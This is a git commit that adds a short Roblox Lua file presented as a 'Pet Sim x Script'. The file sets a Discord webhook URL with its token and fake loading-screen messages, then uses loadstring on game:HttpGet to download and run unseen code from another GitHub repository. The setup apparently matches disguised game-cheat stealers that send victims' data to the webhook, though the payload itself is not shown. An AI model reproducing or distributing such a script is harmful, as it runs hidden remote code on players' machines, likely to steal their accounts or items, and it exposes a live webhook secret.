ff4b05f72beaa4a7c5b12446722fb8d7bdd1a460
BestHubRBX <136733782+BestHubRBX@users.noreply.github.com>
2023-06-15 19:50:50 +0300

    Create script.lua

---
+++ script.lua
@@ -0,0 +1,9 @@
+WebHook = "https://discord.com/api/webhooks/1118931105849024512/Kjd_XN6ihDrKwTyPsBCZEIHtgGfAU2MQvV4jjATvGQcOdB6-CwOQTZ5n0_h57GMQcRsj"
+loadingscreen = true
+_G.Key = "gtedrffe"
+_G.CustomScriptName = "Pet Sim x Script"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script..."
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Script..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script-v4-1.lua"))()
